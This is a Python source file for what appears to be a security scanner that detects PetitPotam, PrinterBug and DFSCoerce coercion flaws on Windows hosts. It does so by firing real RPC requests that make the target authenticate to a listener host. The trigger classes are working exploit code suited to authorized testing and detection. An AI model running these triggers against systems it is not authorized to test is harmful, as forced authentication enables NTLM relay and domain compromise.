"""
Coercion Vulnerability Detector
Detects PetitPotam, PrinterBug, DFSCoerce, etc.
Based on NetExec coerce_plus module
"""

from impacket.dcerpc.v5 import transport, rprn, epm
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRPOINTERNULL
from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin
import contextlib


class CoercionDetector:
    """Detector for authentication coercion vulnerabilities"""

    def __init__(self, config):
        self.config = config
        self.listener = config.coerce_target

    def detect(self, host: str, target_ip: str = None) -> dict:
        """
        Detect coercion vulnerabilities by actually attempting exploits
        Only reports vulnerable if exploit succeeds (gets callback)

        Args:
            host: hostname (used for Kerberos SPN, display)
            target_ip: resolved IP for TCP connection (falls back to host)

        Returns:
            dict with vulnerability names as keys and detailed status as values
        """
        connect_to = target_ip if target_ip else host
        results = {}

        # PetitPotam
        results['PetitPotam'] = self._check_petitpotam(host, connect_to)

        # PrinterBug
        results['PrinterBug'] = self._check_printerbug(host, connect_to)

        # DFSCoerce
        results['DFSCoerce'] = self._check_dfscoerce(host, connect_to)

        return results

    def _get_credentials(self):
        """Get credentials from config"""
        if self.config.null_auth:
            return '', '', '', '', ''
        else:
            return (
                self.config.username or '',
                self.config.password or '',
                self.config.domain or '',
                self.config.lmhash or '',
                self.config.nthash or ''
            )

    def _check_petitpotam(self, host: str, connect_to: str = None) -> dict:
        """Check PetitPotam vulnerability across multiple pipes"""
        if connect_to is None:
            connect_to = host
        result = {'vulnerable': False, 'methods': [], 'error': None}

        username, password, domain, lmhash, nthash = self._get_credentials()
        pipes = ["efsrpc", "lsarpc", "samr", "lsass", "netlogon"]

        for pipe in pipes:
            try:
                petitpotam = PetitPotamTrigger()
                dce = petitpotam.connect(
                    username=username,
                    password=password,
                    domain=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    target=connect_to,
                    doKerberos=self.config.should_use_kerberos(host),
                    dcHost=self.config.dc_ip,
                    aesKey=self.config.aesKey,
                    pipe=pipe,
                    timeout=self.config.coerce_timeout
                )

                if dce is not None:
                    # Try to exploit
                    exploit_methods = petitpotam.exploit(dce, self.listener, pipe)
                    dce.disconnect()

                    if exploit_methods:
                        result['vulnerable'] = True
                        result['methods'].extend(exploit_methods)

            except Exception as e:
                # Handle Kerberos-specific errors - stop trying if Kerberos fails
                # This prevents account lockouts from repeated auth failures
                error_str = str(e).lower()
                if 'kdc' in error_str or 'kerberos' in error_str or 'krb' in error_str:
                    result['error'] = f'Kerberos auth failed: {e}'
                    return result  # Stop testing - Kerberos error means no valid ticket

                # Other connection errors are expected, continue to next pipe
                if self.config.verbose >= 2:
                    result['error'] = str(e)
                continue

        return result

    def _check_printerbug(self, host: str, connect_to: str = None) -> dict:
        """Check PrinterBug vulnerability"""
        if connect_to is None:
            connect_to = host
        result = {'vulnerable': False, 'methods': [], 'error': None}

        username, password, domain, lmhash, nthash = self._get_credentials()
        pipes = ["spoolss", "[dcerpc]"]

        for pipe in pipes:
            try:
                printerbug = PrinterBugTrigger()
                dce = printerbug.connect(
                    username=username,
                    password=password,
                    domain=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    target=connect_to,
                    doKerberos=self.config.should_use_kerberos(host),
                    dcHost=self.config.dc_ip,
                    aesKey=self.config.aesKey,
                    pipe=pipe,
                    timeout=self.config.coerce_timeout
                )

                if dce is not None:
                    # Try to exploit
                    exploit_methods = printerbug.exploit(dce, self.listener, host, pipe)
                    dce.disconnect()

                    if exploit_methods:
                        result['vulnerable'] = True
                        result['methods'].extend(exploit_methods)
                        break  # Success, no need to try other pipes

            except Exception as e:
                # Handle Kerberos-specific errors - stop trying if Kerberos fails
                # This prevents account lockouts from repeated auth failures
                error_str = str(e).lower()
                if 'kdc' in error_str or 'kerberos' in error_str or 'krb' in error_str:
                    result['error'] = f'Kerberos auth failed: {e}'
                    return result  # Stop testing - Kerberos error means no valid ticket

                if self.config.verbose >= 2:
                    result['error'] = str(e)
                continue

        return result

    def _check_dfscoerce(self, host: str, connect_to: str = None) -> dict:
        """Check DFSCoerce vulnerability"""
        if connect_to is None:
            connect_to = host
        result = {'vulnerable': False, 'methods': [], 'error': None}

        username, password, domain, lmhash, nthash = self._get_credentials()

        try:
            dfscoerce = DFSCoerceTrigger()
            dce = dfscoerce.connect(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                target=connect_to,
                doKerberos=self.config.should_use_kerberos(host),
                dcHost=self.config.dc_ip,
                aesKey=self.config.aesKey,
                pipe="netdfs",
                timeout=self.config.coerce_timeout
            )

            if dce is not None:
                # Try to exploit
                exploit_methods = dfscoerce.exploit(dce, self.listener, "netdfs")
                dce.disconnect()

                if exploit_methods:
                    result['vulnerable'] = True
                    result['methods'].extend(exploit_methods)

        except Exception as e:
            # Handle Kerberos-specific errors - stop trying if Kerberos fails
            # This prevents account lockouts from repeated auth failures
            error_str = str(e).lower()
            if 'kdc' in error_str or 'kerberos' in error_str or 'krb' in error_str:
                result['error'] = f'Kerberos auth failed: {e}'
            else:
                result['error'] = str(e)

        return result

    def format_results(self, results: dict) -> str:
        """Format coercion results for display"""
        output = []

        for vuln_name, status in results.items():
            if status['vulnerable']:
                methods_str = ', '.join(status['methods']) if status['methods'] else 'unknown method'

                # Only report as VULNERABLE if we used null auth
                # With credentials, coercion always works and isn't a vulnerability
                if self.config.null_auth:
                    output.append(f"  [+] {vuln_name}: VULNERABLE ({methods_str})")
                elif self.config.verbose >= 1:
                    # If we have creds and verbose, show it worked but not as vulnerability
                    output.append(f"  [*] {vuln_name}: Coercion successful with credentials ({methods_str}) - not a vulnerability")
            else:
                if self.config.verbose >= 2 and status.get('error'):
                    output.append(f"  [-] {vuln_name}: Not vulnerable ({status['error']})")

        return '\n'.join(output) if output else None


# ============================================================================
# Trigger Classes - Based on NetExec coerce_plus module
# ============================================================================

class PetitPotamTrigger:
    """PetitPotam coercion trigger"""

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe, timeout=5):
        binding_params = {
            "lsarpc": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsarpc]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "efsrpc": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\efsrpc]",
                "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
            },
            "samr": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\samr]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "lsass": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsass]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "netlogon": {
                "stringBinding": rf"ncacn_np:{target}[\PIPE\netlogon]",
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
        }

        # Activate EFS
        with contextlib.suppress(Exception):
            get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)

        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)
        rpctransport.set_connect_timeout(timeout)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        try:
            dce.connect()
        except Exception:
            return None

        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EFSR"]))
        except Exception:
            return None

        return dce

    def exploit(self, dce, listener, pipe):
        """
        Attempt PetitPotam exploit methods
        Returns list of successful methods
        """
        successful_methods = []

        # EfsRpcAddUsersToFile
        try:
            request = EfsRpcAddUsersToFile()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                successful_methods.append(f"{pipe}\\EfsRpcAddUsersToFile")

        # EfsRpcAddUsersToFileEx
        try:
            request = EfsRpcAddUsersToFileEx()
            request["dwFlags"] = 0x00000002
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                successful_methods.append(f"{pipe}\\EfsRpcAddUsersToFileEx")

        # EfsRpcDecryptFileSrv
        try:
            request = EfsRpcDecryptFileSrv()
            request["OpenFlag"] = 0
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                successful_methods.append(f"{pipe}\\EfsRpcDecryptFileSrv")

        # EfsRpcEncryptFileSrv
        try:
            request = EfsRpcEncryptFileSrv()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                successful_methods.append(f"{pipe}\\EfsRpcEncryptFileSrv")

        # EfsRpcOpenFileRaw
        try:
            request = EfsRpcOpenFileRaw()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            request["Flags"] = 0
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                successful_methods.append(f"{pipe}\\EfsRpcOpenFileRaw")

        return successful_methods


class PrinterBugTrigger:
    """PrinterBug coercion trigger"""

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe, timeout=5):
        try:
            if pipe == "[dcerpc]":
                string_binding = get_dynamic_endpoint(
                    uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")),
                    target
                )
                port = None
            else:
                string_binding = rf"ncacn_np:{target}[\PIPE\spoolss]"
                port = 445

            rpctransport = transport.DCERPCTransportFactory(string_binding)
            if port is not None:
                rpctransport.set_dport(port)
            rpctransport.set_connect_timeout(timeout)

            if hasattr(rpctransport, "set_credentials"):
                rpctransport.set_credentials(
                    username=username,
                    password=password,
                    domain=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    aesKey=aesKey,
                )

            if doKerberos:
                rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

            rpctransport.setRemoteHost(target)
            dce = rpctransport.get_dce_rpc()
            if doKerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

            dce.connect()
            dce.bind(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")))
            return dce

        except Exception:
            return None

    def exploit(self, dce, listener, target, pipe):
        """
        Attempt PrinterBug exploit
        Returns list of successful methods
        """
        successful_methods = []

        # RpcRemoteFindFirstPrinterChangeNotificationEx
        try:
            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request["hPrinter"] = resp["pHandle"]
            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
            request["pszLocalMachine"] = f"\\\\{listener}\x00"
            request["fdwOptions"] = 0x00000000
            request["dwPrinterLocal"] = 0
            try:
                dce.request(request)
                # If the call succeeds without error, coercion was triggered
                successful_methods.append(f"{pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
            except Exception as e:
                error_str = str(e)
                # ERROR_BAD_NETPATH means the target tried to connect to our listener (coercion worked)
                # rpc_s_access_denied at the notification level means spooler is reachable but denied
                # the notification request - spooler is active and may still trigger callback
                if "ERROR_BAD_NETPATH" in error_str:
                    successful_methods.append(f"{pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
        except Exception:
            # hRpcOpenPrinter failed - spooler not accessible via this pipe
            pass

        return successful_methods


class DFSCoerceTrigger:
    """DFSCoerce trigger"""

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe, timeout=5):
        string_binding = rf"ncacn_np:{target}[\PIPE\netdfs]"
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_dport(445)
        rpctransport.set_connect_timeout(timeout)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        try:
            dce.connect()
        except Exception:
            return None

        try:
            dce.bind(uuidtup_to_bin(("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0")))
        except Exception:
            return None

        return dce

    def exploit(self, dce, listener, pipe):
        """
        Attempt DFSCoerce exploit methods
        Returns list of successful methods
        """
        successful_methods = []

        # NetrDfsAddRootTarget
        try:
            request = NetrDfsAddRootTarget()
            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
            request["pTargetPath"] = NULL
            request["MajorVersion"] = 0
            request["pComment"] = "test\x00"
            request["NewNamespace"] = 0
            request["Flags"] = 0
            dce.request(request)
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ["rpc_s_access_denied", "ERROR_BAD_NETPATH", "RPC_S_INVALID_NET_ADDR"]):
                successful_methods.append(f"{pipe}\\NetrDfsAddRootTarget")

        # NetrDfsRemoveRootTarget
        try:
            request = NetrDfsRemoveRootTarget()
            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
            request["pTargetPath"] = NULL
            request["Flags"] = 0
            dce.request(request)
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ["rpc_s_access_denied", "ERROR_BAD_NETPATH", "RPC_S_INVALID_NET_ADDR"]):
                successful_methods.append(f"{pipe}\\NetrDfsRemoveRootTarget")

        return successful_methods


# ============================================================================
# Helper Functions
# ============================================================================

def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
    """Get dynamic RPC endpoint"""
    string_binding = rf"ncacn_ip_tcp:{target}[135]"
    rpctransport = transport.DCERPCTransportFactory(string_binding)
    rpctransport.set_connect_timeout(timeout)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)


# ============================================================================
# RPC Structures - Copied from NetExec coerce_plus
# ============================================================================

class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ("FileName", WSTR),
        ("Flags", LONG),
    )


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ("FileName", WSTR),
    )


class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ("cbData", DWORD),
        ("pbData", PCHAR),
    )


class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ("Length", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_HASH_BLOB),
        ("Display", LPWSTR),
    )


class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    structure = (
        ("nUsers", DWORD),
        ("Users", ENCRYPTION_CERTIFICATE_HASH),
    )


class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ("FileName", WSTR),
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST)
    )


class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ("dwFlags", DWORD),
        ("Reserved", NDRPOINTERNULL),
        ("FileName", WSTR),
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),
    )


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ("FileName", WSTR),
        ("OpenFlag", ULONG),
    )


class NetrDfsAddRootTarget(NDRCALL):
    opnum = 23
    structure = (
        ("pDfsPath", LPWSTR),
        ("pTargetPath", LPWSTR),
        ("MajorVersion", ULONG),
        ("pComment", LPWSTR),
        ("NewNamespace", BOOL),
        ("Flags", ULONG),
    )


class NetrDfsRemoveRootTarget(NDRCALL):
    opnum = 24
    structure = (
        ("pDfsPath", LPWSTR),
        ("pTargetPath", LPWSTR),
        ("Flags", ULONG),
    )
